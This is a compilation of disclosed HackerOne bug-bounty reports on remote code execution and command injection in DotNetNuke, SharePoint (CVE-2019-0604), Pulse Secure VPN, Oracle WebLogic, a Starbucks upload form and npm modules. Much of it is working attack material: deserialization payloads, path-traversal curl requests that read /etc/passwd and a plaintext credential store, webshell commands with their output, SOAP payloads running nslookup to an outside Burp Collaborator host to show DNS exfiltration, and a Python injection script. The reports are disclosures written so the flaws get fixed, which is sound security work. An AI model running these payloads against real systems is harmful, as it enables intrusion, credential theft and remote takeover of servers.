JSON supplied via the `DOCKER_AUTH_CONFIG` build variable should be processed to ensure it does not contain malicious content.

## Relevant logs and/or screenshots

{F943021}

## Output of checks

`gitlab-runner --version`
```
Version:      13.2.2
Git revision: a998cacd
Git branch:   refs/pipelines/172580057
GO version:   go1.13.8
Built:        2020-07-30T14:52:23+0000
OS/Arch:      windows/amd64
```

`config.toml`
```toml
concurrent = 1
check_interval = 0

[session_server]
  session_timeout = 1800

[[runners]]
  name = "windows"
  url = "https://gitlab.com"
  token = "█████"
  executor = "docker-windows"
  [runners.custom_build_dir]
  [runners.cache]
    [runners.cache.s3]
    [runners.cache.gcs]
  [runners.docker]
    tls_verify = false
    image = "mcr.microsoft.com/windows/servercore:1809"
    privileged = false
    disable_entrypoint_overwrite = false
    oom_kill_disable = false
    disable_cache = false
    volumes = ["c:\\cache"]
    shm_size = 0
```

## Impact

Exploitation of this issue could compromise the underlying system on which `gitlab-runner` runs, exposing source code, build artifacts and other sensitive data to a malicious user.

---

### [Remote Code Execution through DNN Cookie Deserialization ](https://hackerone.com/reports/876708)

- **Report ID:** `876708`
- **Severity:** High
- **Weakness:** OS Command Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @cristiancornea
- **Bounty:** - usd
- **Disclosed:** 2020-05-27T14:06:11.705Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
The application at ```https://████████``` presents a deserialization vulnerability that permits RCE and file read/write

## Step-by-step Reproduction Instructions

1. Navigate to a random page that must return a 404 Error status like ```https://████/test```
2. Add this cookie in the request header: ```DNNPersonalization```
3. Insert the payload into the ```DNNPersonalization``` cookie. You can generate a payload with the following tool https://github.com/pwntester/ysoserial.net, using the DotNetNuke plugin, or use the official exploit from here: https://www.exploit-db.com/exploits/48336, or use the following payload to read a file from the system:

```
<profile>
<item key="name1:key1" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=█████████]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=███████"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
<ExpandedElement/>
<ProjectedProperty0>
<MethodName>WriteFile</MethodName>
<MethodParameters>
<anyType xsi:type="xsd:string">test</anyType>
</MethodParameters>
<ObjectInstance xsi:type="FileSystemUtils"></ObjectInstance>
</ProjectedProperty0>
</ExpandedWrapperOfFileSystemUtilsObjectDataProvider>
</item>
</profile>
```

Where ```test``` is the wanted file

Expected result:
████


## Product, Version, and Configuration (If applicable)
Platform: https://████████/shell.aspx
Vulnerable Product: DotNetNuke
Vulnerable Version: < 9.3.0-RC


## Suggested Mitigation/Remediation Actions
Update the DotNetNuke (DNN) product to the latest version or to a more recent version that is not vulnerable

## Impact

An attacker can execute remote commands on the system and gain unauthorized access to it.

---

### [Remote Code Execution - Unauthenticated Remote Command Injection (via Microsoft SharePoint CVE-2019-0604)](https://hackerone.com/reports/534630)

- **Report ID:** `534630`
- **Severity:** High
- **Weakness:** OS Command Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @l00ph0le
- **Bounty:** - usd
- **Disclosed:** 2020-05-11T16:53:43.669Z
- **CVE(s):** CVE-2019-0604

**Vulnerability Information:**

**Summary:**
Microsoft recently released a patch for CVE-2019-0604. This vulnerability is caused by the Microsoft SharePoint application deserializing untrusted data from a user.

This means an attacker can send a specially crafted/encoded parameter to a Microsoft SharePoint URL, and it will allow Remote Code Execution or Command Injection on the server.

This is an in-depth blog post about the vulnerability.
https://www.thezdi.com/blog/2019/3/13/cve-2019-0604-details-of-a-microsoft-sharepoint-rce-vulnerability

The ████ SharePoint site suffers from this vulnerability. The URL for the main site is: https://████/███████/OrgStruct/StandingGroups/Pages/default.aspx 

**Description:**

## Impact
The impact is high. Using the steps below an attacker can run any windows command line on the SharePoint server.

## Step-by-step Reproduction Instructions

1. Clone this github repository for the PoC code https://github.com/l00ph0le/CVE-2019-0604.git
2. Edit the second "<System:String>/c calc</System:String>" in t.xml to the command you would like to execute on the windows server. I edited mind to send a ping request to a ubuntu server hosted on the Internet. The final file looks like this:

<ResourceDictionary
xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
xmlns:System="clr-namespace:System;assembly=mscorlib"
xmlns:Diag="clr-namespace:System.Diagnostics;assembly=system">
	<ObjectDataProvider x:Key="LaunchCalch" ObjectType="{x:Type Diag:Process}" MethodName="Start">
		<ObjectDataProvider.MethodParameters>
			<System:String>cmd.exe</System:String>
			<System:String>/c ping cloudbox2.legithost.info</System:String>
		</ObjectDataProvider.MethodParameters>
	</ObjectDataProvider>
</ResourceDictionary>

3. User "ConsoleApplication1.exe" to generate the encoded payload like this:
c:/>cd c:\CVE-2019-0604\ConsoleApplication1\ConsoleApplication1\bin\Debug\

c:/CVE-2019-0604\ConsoleApplication1\ConsoleApplication1\bin\Debug\>ConsoleApplication1.exe c:/CVE-2019-0604/t.xml

4. This will produce an encoded string that begins with "__", copy this string.

5. Setup an Interception proxy (BurpSuite). 

6. Browse to the vulnerable URL:
https://████/████/OrgStruct/StandingGroups/_layouts/15/picker.aspx?PickerDialogType=Microsoft.SharePoint.WebControls.ItemPickerDialog,%20Microsoft.SharePoint,%20Version=15.0.0.0,%20Culture=neutral,%20PublicKeyToken=71e9bce111e9429c

7. When the "Picker.aspx" page loads, click the hour glass in the right hand corner, and stop the request with burp suite. In the request look for the parameter "ctl00%24PlaceHolderDialogBodySection%24ctl05%24hiddenSpanData=", and set the value to the encoded string you generated with ConsoleAPplication1.exe. Leave the request paused. The string will look something like this:

__bp4b7135009700370047005600d600e2004400160047001600e20035005600270067009600360056003700e2009400e600470056002700e6001600c600e2005400870007001600e600460056004600750027001600070007005600270006002300b500b50035009700370047005600d600e20075009600e6004600f60077003700e200d40016002700b60057000700e20085001600d600c600250056001600460056002700c200020005002700560037005600e6004700160047009600f600e600640027001600d60056007700f6002700b600c200020065005600270037009600f600e600d3004300e2000300e2000300e2000300c200020034005700c6004700570027005600d300e60056005700470027001600c600c2000200050057002600c60096003600b400560097004500f600b6005600e600d3003300130026006600330083005300630016004600330063004300560033005300d500c200b50035009700370047005600d600e20075009600e6004600f60077003700e2004400160047001600e200f4002600a600560036004700440016004700160005002700f60067009600460056002700c200020005002700560037005600e6004700160047009600f600e600640027001600d60056007700f6002700b600c200020065005600270037009600f600e600d3004300e2000300e2000300e2000300c200020034005700c6004700570027005600d300e60056005700470027001600c600c2000200050057002600c60096003600b400560097004500f600b6005600e600d3003300130026006600330083005300630016004600330063004300560033005300d500d500c200020035009700370047005600d600e2004400160047001600e20035005600270067009600360056003700c200020065005600270037009600f600e600d3004300e2000300e2000300e2000300c200020034005700c6004700570027005600d300e60056005700470027001600c600c2000200050057002600c60096003600b400560097004500f600b6005600e600d3002600730073001600530036005300630013009300330043005600030083009300a300c300f3008700d600c600020067005600270037009600f600e600d30022001300e2000300220002005600e6003600f60046009600e6007600d3002200570047006600d200130063002200f300e300d000a000c3005400870007001600e6004600560046007500270016000700070056002700f400660085001600d600c600250056001600460056002700f4002600a600560036004700440016004700160005002700f6006700960046005600270002008700d600c600e6003700a300870037009600d30022008600470047000700a300f200f200770077007700e20077003300e200f60027007600f2002300030003001300f2008500d400c4003500360086005600d6001600d2009600e600370047001600e60036005600220002008700d600c600e6003700a300870037004600d30022008600470047000700a300f200f200770077007700e20077003300e200f60027007600f2002300030003001300f2008500d400c4003500360086005600d60016002200e300d000a00002000200c30005002700f600a6005600360047005600460005002700f600070056002700470097000300e300d000a0000200020002000200c300f4002600a6005600360047009400e600370047001600e600360056000200870037009600a3004700970007005600d300220085001600d600c60025005600160046005600270022000200f200e300d000a0000200020002000200c300d400560047008600f6004600e4001600d6005600e30005001600270037005600c300f200d400560047008600f6004600e4001600d6005600e300d000a0000200020002000200c300d400560047008600f60046000500160027001600d60056004700560027003700e300d000a000020002000200020002000200c3001600e600970045009700070056000200870037009600a3004700970007005600d3002200870037004600a3003700470027009600e60076002200e3006200c6004700b300250056003700f600570027003600560044009600360047009600f600e600160027009700d000a0008700d600c600e6003700d30022008600470047000700a300f200f2003700360086005600d60016003700e200d600960036002700f6003700f60066004700e2003600f600d600f20077009600e60066008700f2002300030003006300f20087001600d600c600f20007002700560037005600e6004700160047009600f600e6002200d000a0008700d600c600e6003700a3008700d30022008600470047000700a300f200f2003700360086005600d60016003700e200d600960036002700f6003700f60066004700e2003600f600d600f20077009600e60066008700f2002300030003006300f20087001600d600c6002200d000a0008700d600c600e6003700a30035009700370047005600d600d30022003600c6002700d200e6001600d600560037000700160036005600a30035009700370047005600d600b3001600370037005600d6002600c6009700d300d60037003600f6002700c600960026002200d000a0008700d600c600e6003700a3004400960016007600d30022003600c6002700d200e6001600d600560037000700160036005600a30035009700370047005600d600e2004400960016007600e600f60037004700960036003700b3001600370037005600d6002600c6009700d30037009700370047005600d6002200620076004700b300d000a00090006200c6004700b300f4002600a600560036004700440016004700160005002700f6006700960046005600270002008700a300b40056009700d3002200c40016005700e600360086003400d600460022000200f4002600a6005600360047004500970007005600d3002200b7008700a300450097000700560002004400960016007600a30005002700f6003600560037003700d70022000200d400560047008600f6004600e4001600d6005600d3002200350047001600270047002200620076004700b300d000a000900090006200c6004700b300f4002600a600560036004700440016004700160005002700f60067009600460056002700e200d400560047008600f60046000500160027001600d60056004700560027003700620076004700b300d000a0009000900090006200c6004700b30035009700370047005600d600a3003500470027009600e6007600620076004700b3003600d6004600e2005600870056006200c6004700b300f20035009700370047005600d600a3003500470027009600e6007600620076004700b300d000a0009000900090006200c6004700b30035009700370047005600d600a3003500470027009600e6007600620076004700b300f2003600020007009600e600760002003600c600f600570046002600f60087002300e200c60056007600960047008600f60037004700e2009600e6006600f6006200c6004700b300f20035009700370047005600d600a3003500470027009600e6007600620076004700b300d000a000900090006200c6004700b300f200f4002600a600560036004700440016004700160005002700f60067009600460056002700e200d400560047008600f60046000500160027001600d60056004700560027003700620076004700b300d000a00090006200c6004700b300f200f4002600a600560036004700440016004700160005002700f60067009600460056002700620076004700b300d000a0006200c6004700b300f200250056003700f600570027003600560044009600360047009600f600e600160027009700620076004700b300c300f2001600e60097004500970007005600e300d000a0000200020002000200c300f200d400560047008600f60046000500160027001600d60056004700560027003700e300d000a00002000200c300f20005002700f600a6005600360047005600460005002700f600070056002700470097000300e300d000a000c300f2005400870007001600e6004600560046007500270016000700070056002700f400660085001600d600c600250056001600460056002700f4002600a600560036004700440016004700160005002700f60067009600460056002700e300

8. Setup a linux box on the internet with tcpdump to list for icmp requests. Using the following command (my network interface is called venet0, yours will be different) :
tcpdump -nni venet0 -e icmp[icmptype] == 8

9. Allow the request to go through with BurpSuite, the ping command will execute and you will see the ping requests come to you linux server from a source IP address of: █████████

See attached video for a walk through of exploitation. Please reach out if you have any additional questions.

## Product, Version, and Configuration (If applicable)
The vulnerability affects four versions of SharePoint. So you may have more exposure.
Microsoft SharePoint Enterprise Server 2016	
Microsoft SharePoint Foundation 2013 Service Pack 1
Microsoft SharePoint Server 2010 Service Pack 2
Microsoft SharePoint Server 2019

## Suggested Mitigation/Remediation Actions
Install the SharePoint Security Patches Released by Microsoft on March 12th found here:
https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0604

## Impact

An attacker could compromise the windows server that SharePoint is running on. This vulnerability will grant command line server access in the context of the user that SharePoint services are running as. Even if a low privileged user is being utilized for SharePoint services, it gives an attacker a foothold for privilege escalation or moving laterally through the network that the SharePoint server resides on.

---

### [Remote Code Execution in ██████](https://hackerone.com/reports/710864)

- **Report ID:** `710864`
- **Severity:** Critical
- **Weakness:** OS Command Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @0xs3cr3t
- **Bounty:** - usd
- **Disclosed:** 2020-05-11T16:36:39.812Z
- **CVE(s):** -

**Summary (team):**

The vulnerability you reported has been resolved and this report is now closed. If you have any further questions or disagree that the report is resolved, please let us know.

Thank you for your time and effort to improve the security of the DoD information network.

Thanks @s3cr3tsdn for reporting RCE in a DoD website.  Issue has been resolved and report placed into a disclosed summary status as you requested.

----------------------------
Hi @everyone,
i'm going to make a detailed writeup for this report disclosing a new tool for mass exploitation of these bugs starting from one google dork,
you will find it on @sud0root medium blog,
Best Wishes and happy hunting,
@S3cr3tSDN.
----------------------------

---

### [[listening-processes] Command Injection](https://hackerone.com/reports/511459)

- **Report ID:** `511459`
- **Severity:** Critical
- **Weakness:** OS Command Injection
- **Program:** Node.js third-party modules
- **Reporter:** @notpwnguy
- **Bounty:** - usd
- **Disclosed:** 2020-02-02T23:00:31.595Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report Command Injection in listening-processes
It allows an attacker to execute arbitrary commands.

# Module

**module name:** listening-processes
**version:** 1.2.0
**npm page:** `https://www.npmjs.com/package/listening-processes`

## Module Description

> A simple NPM module for retrieving pertinent info on processes which are listening on local ports, and for killing those processes using shell commands lsof, ps, and kill in the background.

## Module Stats

6 downloads in the last day
12 downloads in the last week
28 downloads in the last month

# Vulnerability

## Vulnerability Description

> An attacker can execute arbitrary commands by escaping the binaries used by the module since it uses bash commands. 

## Steps To Reproduce:

```
$ node
> const processes = require('listening-processes')
> processes(`'Python && whoami >> hh;'`)
/bin/sh: \s.*:[0-9]* (LISTEN): command not found
{ Python:
   [ { command: 'Python',
       pid: '14720',
       port: '8000',
       invokingCommand:
        '/usr/local/Cellar/python/3.7.0/Frameworks/Python.framework/Versions/3.7/Resources/Python.app/Contents/MacOS/Python -m http.server' } ] }
```
```
$ cat hh
notpwnguy
```
## Patch

> If you're able to provide a patch with the fix please post it in this section

## Supporting Material/References:

> State all technical information about the stack where the vulnerability was found

- OPERATING SYSTEM VERSION : Mac Os
- NODEJS VERSION : v10.5.0
- NPM VERSION : 6.2.0

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

Arbitrary Commands can be executed!

---

### [Store Development Resource Center was vulnerable to a Remote Code Execution - Unauthenticated Remote Command Injection (CVE-2019-0604)](https://hackerone.com/reports/536134)

- **Report ID:** `536134`
- **Severity:** Critical
- **Weakness:** OS Command Injection
- **Program:** Starbucks
- **Reporter:** @l00ph0le
- **Bounty:** - usd
- **Disclosed:** 2019-12-12T21:52:55.425Z
- **CVE(s):** CVE-2019-0604

**Summary (team):**

l00ph0le discovered an endpoint on the Store Development Resource Center site at https://sdrc.starbucks.com/_layouts/15/picker.aspx was vulnerable to a deserialization RCE in Microsoft Sharepoint per CVE-2019-0604.

@l00ph0le — thank you for reporting this vulnerability, your patience while we applied the patch and for confirming the resolution.

---

### [Arbitrary File Reading leads to RCE in the Pulse Secure SSL VPN on the https://███](https://hackerone.com/reports/678496)

- **Report ID:** `678496`
- **Severity:** Critical
- **Weakness:** OS Command Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @sp1d3rs
- **Bounty:** - usd
- **Disclosed:** 2019-12-02T19:59:54.014Z
- **CVE(s):** CVE-2019-11510, CVE-2019-11542, CVE-2019-11539, CVE-2019-11538, CVE-2019-11508, CVE-2019-11540

**Vulnerability Information:**

##Description
Hello. Some time ago, researcher Orange Tsai from DEVCORE team had a talk on Defcon/BlackHat regarding Pulse Secure SSL VPN vulnerabilities fixed on 2019/4/25:
**CVE-2019-11510 - Pre-auth Arbitrary File Reading**
CVE-2019-11542 - Post-auth Stack Buffer Overflow
**CVE-2019-11539 - Post-auth Command Injection**
CVE-2019-11538 - Post-auth Arbitrary File Reading
**CVE-2019-11508 - Post-auth Arbitrary File Writing**
CVE-2019-11540 - Post-auth Session Hijacking

Link to the slides: https://i.blackhat.com/USA-19/Wednesday/us-19-Tsai-Infiltrating-Corporate-Intranet-Like-NSA.pdf

I discovered that https://████ instance is vulnerable to described vulnerabilities.

##POC
Extracting `/etc/passwd` as example:
```
curl -i -k --path-as-is https://██████/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/
```
{F561180}

The RCE can be achieved with this chain:
1) Pulse Secure stores credentials in the cleartext.
2) Attacker reads credentials via CVE-2019-11510 (it stored in the `/data/runtime/mtmp/lmdb/dataa/data.mdb`) and authorizes on VPN
3) Attacker exploits CVE-2019-11539 - Post-auth Command Injection achieving RCE as root.

##Suggested fix
Update the Pulse Secure SSL VPN software (also implementing certificate validation can harden access a bit if some similar CVEs will be discovered in future).

## Impact

Remote code execution as root (by reading plaintext credentials and then exploiting CVE-2019-11539 - Post-auth Command Injection) and accessing intranet behind VPN.

---

### [Pulse Secure File disclosure, clear text and potential RCE](https://hackerone.com/reports/671749)

- **Report ID:** `671749`
- **Severity:** Critical
- **Weakness:** OS Command Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @alyssa_herrera
- **Bounty:** - usd
- **Disclosed:** 2019-12-02T19:29:23.319Z
- **CVE(s):** CVE-2019-11510

**Vulnerability Information:**

**Summary:**
Pulse Secure has two main vulnerabilities that allow file disclosure and post auth RCE
**Description:**
CVE-2019-11510  is a file disclosure due to some normalization issues in pulse secure. I was able to reproduce this by  grabbing in the etc/passswd. 
https://$hax/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/#

Though the impact of that is very limited, medium to high sec at best. From here we can grab a specific file.

The file /data/runtime/mtmp/lmdb/dataa/data.mdb contains clear context passwords and usernames, when a user logs in from here we can then access the Pulse secure instance. I stopped here due to not wanting to break the rules of engagements but from here I would log in then exploit a Post auth exploit.


Here's a list of files that an attacker would instantly hit
/data/runtime/mtmp/system
/data/runtime/mtmp/lmdb/dataa/data.mdb
/data/runtime/mtmp/lmdb/dataa/lock.mdb
/data/runtime/mtmp/lmdb/randomVal/data.mdb
/data/runtime/mtmp/lmdb/randomVal/lock.mdb
## Impact
Critical 
## Step-by-step Reproduction Instructions
We can only do this  using due to browsers messing up the exploit

curl --path-as-is -k -D- https://████████/dana-na/../dana/html5acc/guacamole/../../../../../../data/runtime/mtmp/lmdb/dataa/data.mdb?/dana/html5acc/guacamole/#

 curl --path-as-is -k -D- https://████████/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/#

 curl --path-as-is -k -D- https://███/dana-na/../dana/html5acc/guacamole/../../../../../../data/runtime/mtmp/lmdb/dataa/data.mdb?/dana/html5acc/guacamole/#

## Product, Version, and Configuration (If applicable)
Pulse Secure
## Suggested Mitigation/Remediation Actions
Patch pulse immediately

## Impact

An attacker will be able to download internal files and specifically target a local file which stores clear text passwords when a user login. This also an attacker to access highly sensitive internal areas and even can perform command execution

---

### [Webshell via File Upload on ecjobs.starbucks.com.cn](https://hackerone.com/reports/506646)

- **Report ID:** `506646`
- **Severity:** Critical
- **Weakness:** OS Command Injection
- **Program:** Starbucks
- **Reporter:** @johnstone
- **Bounty:** - usd
- **Disclosed:** 2019-11-13T00:38:41.593Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:** 
OS Command Injection which can let the attacker who get more important information of the server,such as disclosures internal source code of the webapp,database data and invade the internal network.

**Description:** 
I found that users can upload asp/aspx and other dynamic files via the avatar upload function when adding a space character behind the file type to bypass the upload file limit.The attacker can run malicious cmd on the server.

## Steps To Reproduce:

  1. Sign in the url(https://ecjobs.starbucks.com.cn) and direct to the resume endpoint.
  2. Use burp suite tools to interupt the avatar upload request.
  3. Replace the filename type ```.jpg``` to ```asp ```which have a space character behind and modify the content

  After that you have uploaded malicious files on the server and run any os command on server you wanted.
Do some command like list all files on the server

```
curl -i -s -k  -X $'GET' \
    -H $'Host: ecjobs.starbucks.com.cn' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Cookie: _ga=GA1.3.779308870.1546486037; ASP.NET_SessionId=w2dbbzgyv3cu0hiiwkysnooo; ASPSESSIONIDSSSBQTQR=FKJDKLGAKJKDALIKOJMJBLAF; ASPSESSIONIDSQRDSRRR=DLNDLPJANKNIAGPMFDEGFLIF' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'_ga=GA1.3.779308870.1546486037; ASP.NET_SessionId=w2dbbzgyv3cu0hiiwkysnooo; ASPSESSIONIDSSSBQTQR=FKJDKLGAKJKDALIKOJMJBLAF; ASPSESSIONIDSQRDSRRR=DLNDLPJANKNIAGPMFDEGFLIF' \
    $'https://ecjobs.starbucks.com.cn/recruitjob/tempfiles/temp_uploaded_739175df-5949-4bba-9945-1c1720e8e109.asp?getsc=dir%20d:\\TrustHX\\STBKSERM101\\www_app%20%2fd%2fs%2fb'
```

**The response content:**

```
HTTP/1.1 200 OK
Date: Fri, 08 Mar 2019 02:56:19 GMT
Server: wswaf/2.13.0-5.el6
Content-Type: text/html
Cache-Control: private
X-Powered-By: ASP.NET
X-Via: 1.1 jszjsx51:1 (Cdn Cache Server V2.0), 1.1 PSjxncdx5rt58:6 (Cdn Cache Server V2.0)
Connection: close
Content-Length: 1814533

<html>
<body>
<h1>POC by hackerone_john stone</h1>
<textarea readonly cols=80 rows=25>
d:\TrustHX\STBKSERM101\www_app\bin
d:\TrustHX\STBKSERM101\www_app\common
d:\TrustHX\STBKSERM101\www_app\concurrent_test
d:\TrustHX\STBKSERM101\www_app\Default.aspx
d:\TrustHX\STBKSERM101\www_app\Global.asax
d:\TrustHX\STBKSERM101\www_app\hximages_v6
....................................
</textarea>
</body>
</html>
```

**Show the internal source code**
```
curl -i -s -k  -X $'GET' \
    -H $'Host: ecjobs.starbucks.com.cn' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Cookie: _ga=GA1.3.779308870.1546486037; ASP.NET_SessionId=w2dbbzgyv3cu0hiiwkysnooo; ASPSESSIONIDSSSBQTQR=FKJDKLGAKJKDALIKOJMJBLAF; ASPSESSIONIDSQRDSRRR=DLNDLPJANKNIAGPMFDEGFLIF' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'_ga=GA1.3.779308870.1546486037; ASP.NET_SessionId=w2dbbzgyv3cu0hiiwkysnooo; ASPSESSIONIDSSSBQTQR=FKJDKLGAKJKDALIKOJMJBLAF; ASPSESSIONIDSQRDSRRR=DLNDLPJANKNIAGPMFDEGFLIF' \
    $'https://ecjobs.starbucks.com.cn/recruitjob/tempfiles/temp_uploaded_739175df-5949-4bba-9945-1c1720e8e109.asp?getsc=type%20d:\\TrustHX\\STBKSERM101\\www_app\\concurrent_test\\new_application_concurrent_test__svc.cs'
```
the source code respones:
```
HTTP/1.1 200 OK
Date: Fri, 08 Mar 2019 03:37:39 GMT
Server: wswaf/2.13.0-5.el6
Content-Type: text/html
Cache-Control: private
X-Powered-By: ASP.NET
X-Via: 1.1 jszjsx51:0 (Cdn Cache Server V2.0), 1.1 ydx154:3 (Cdn Cache Server V2.0)
Connection: close
Content-Length: 33316

<html>
<body>
<h1>POC by hackerone_john stone</h1>
<textarea readonly cols=80 rows=25>
ï»¿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System;
using System.Collections.Specialized;
using System.Collections.Generic;
using System.Data;
using System.Configuration;
using System.Xml;
using System.Transactions;
using System.Text;
using System.Threading;
using System.Web;

using TrustHX.IHXEIMS6;
using hxsys = TrustHX.HXEIMS6;
using hxwww = TrustHX.HXWWW6;
using hxsm = TrustHX.HXSM6;
using hxmd = TrustHX.HXMD6;


class new_application_concurrent_test : IHXPageXmlService
{
    #region IHXPageXmlService æå
    string IHXPageXmlService.Run(string strSystemCode, string strPageXmlServiceCode, string strPageXmlServiceContent, string strHXPageParamUUID, string strHXPageName)
    {
        try
        {
            switch (strPageXmlServiceCode)
            {
                case "PREPARE_CONCURRENT_DATA":return ConcurrentDataPrepare.ConcurrentDataPrepareProcess(strSystemCode, strPageXmlServiceContent);
                case "CONCURRENT_TEST":return ConcurrentTest.ConcurrentTestProcess(strSystemCode, strPageXmlServiceContent);
                default:
                    string strErrorMessageText =
....................................
</textarea>
</body>
</html>
```

## Recommendations for fix

*Strictly limit file upload types
*Only allow jpg/png/gif/jpeg file parsing on the uploaded fiels
*More safe code design

Thks!Looking forward to your reply.
With kind regards
John stone

## Impact

disclosures  the internal source code data and user's information,broken ring server,etc.

**Summary (team):**

johnstone discovered An arbitrary file upload via the resume functionality at https://ecjobs.starbucks.com.cn which led to arbitrary code execution by uploading a webshell.
@johnstone   — thank for reporting this vulnerability, your patience while we followed up on the issue internally and for your additional effort to confirm the resolution.

---

### [Remote OS command Execution in the 3 more Oracle Weblogic on the ████████, ████, ███████ [CVE-2017-10352]](https://hackerone.com/reports/634630)

- **Report ID:** `634630`
- **Severity:** Critical
- **Weakness:** OS Command Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @sp1d3rs
- **Bounty:** - usd
- **Disclosed:** 2019-10-08T18:38:21.064Z
- **CVE(s):** CVE-2017-10352

**Vulnerability Information:**

##Description
Hello. I was able to identify 3 more RCE vulnerabilities due to the outdated Oracle Weblogic instance on the █████████, ███, █████
After my previous discoveries I decided to dig deeper into the `███.mil` scope/IP space and found other instances of vulnerable Oracle WebLogic. I decided to fill all this additional findings in the single report

##POC
This request to the https://█████████/wls-wsat/CoordinatorPortType will trigger sleep for 10 seconds (same applies for ████████, ███████):

```
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: █████████
Content-Length: 423
content-type: text/xml
Accept-Encoding: gzip, deflate, compress
Accept: */*

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java class="java.beans.XMLDecoder">
        <object class="java.lang.Thread" method="sleep">
          <long>10000</long>
        </object>
      </java>  
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
```

The next request will resolve custom Burp Collaborator hostname via `nslookup` OS command to prove that it's possible to exfiltrate data via DNS:
```
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: ███
Content-Length: 724
content-type: text/xml
Accept-Encoding: gzip, deflate, compress
Accept: */*

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> 
	<soapenv:Header>
		<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> 
			<java version="1.8.0_151" class="java.beans.XMLDecoder"> 
			<void class="java.lang.ProcessBuilder"> 
				<array class="java.lang.String" length="3">
				<void index = "0">
					<string>cmd</string>
				</void>
				<void index = "1"> 
					<string>/c</string> 
				</void>
				<void index = "2">
					<string>nslookup j3nxpi8ecz9uznkpu32mb7pj9af13q.burpcollaborator.net</string>
				</void>
			</array>
			<void method="start"/>
			</void>
			</java>
			</work:WorkContext> 
	</soapenv:Header> 
<soapenv:Body/>
</soapenv:Envelope>
```


Note: to reproduce the second case with `nslookup`, `j3nxpi8ecz9uznkpu32mb7pj9af13q.burpcollaborator.net` host should be replaced by your own Burp Collaborator instance to catch the DNS request

##Suggested fix
Patching WebLogic to the resent version will fix the issue.

## Impact

Remote OS command execution.

---

### [gitlabhook OS Command Injection](https://hackerone.com/reports/685447)

- **Report ID:** `685447`
- **Severity:** Critical
- **Weakness:** OS Command Injection
- **Program:** Node.js third-party modules
- **Reporter:** @samlyhin
- **Bounty:** - usd
- **Disclosed:** 2019-09-13T10:37:00.269Z
- **CVE(s):** CVE-2019-5485

**Vulnerability Information:**

I would like to report OS Command Injection in gitlabhook.
It allows execution of arbitrary code on the remote server, that waits for instructions from gitlab.

# Module

**module name:** gitlabhook 
**version:** 0.0.17
**npm page:** `https://www.npmjs.com/package/gitlabhook`

## Module Description

This is an easy to use nodeJS based web hook for GitLab.

## Module Stats

[5] downloads in the last week

# Vulnerability

## Vulnerability Description

Function "ExecFile" at line 146 executes commands without any sanitization. User input gets passed directly to this command. 

## Steps To Reproduce:

An exploit on python3 was created. 

```
#!/usr/bin/python

import requests

target = "http://192.168.126.128:3420"
cmd = r"touch /tmp/poc.txt"
json = '{"repository":{"name": "Diasporrra\'; %s;\'"}}'% cmd
r = requests.post(target, json)

print "Done."
```

Please follow these steps:
1.   Create a temporary directory on the filesystem. mkdir /tmp/temp cd /tmp/temp
2.   Install the module: npm install gitlabhook
3.    Change directory: cd node_modules/gitlabhook/
4.    Run the application: node gitlabhook-server.js

At step 4, you should see that the server is up and running. It should send a big message to the terminal, and this message should finish with the line:

```
listening for github events on 0.0.0.0:3420
```

This server was set up on Kali Linux machine. This machine has an interface with IP address 192.168.126.128.

I have another machine on Windows, that can reach this Kali Linux machine by the above IP. This Windows machine has python3 installed, and python requests module installed too.

So, edit the exploit and run it.

```
#!/usr/bin/python

import requests

target = "http://192.168.126.128:3420" #put target IP and port here
cmd = r"touch /tmp/poc.txt" #a command to execute
json = '{"repository":{"name": "Diasporrra\'; %s;\'"}}'% cmd
r = requests.post(target, json)

print ("Done.")
```

The exploit above should create a file /tmp/poc.txt on the victim server.

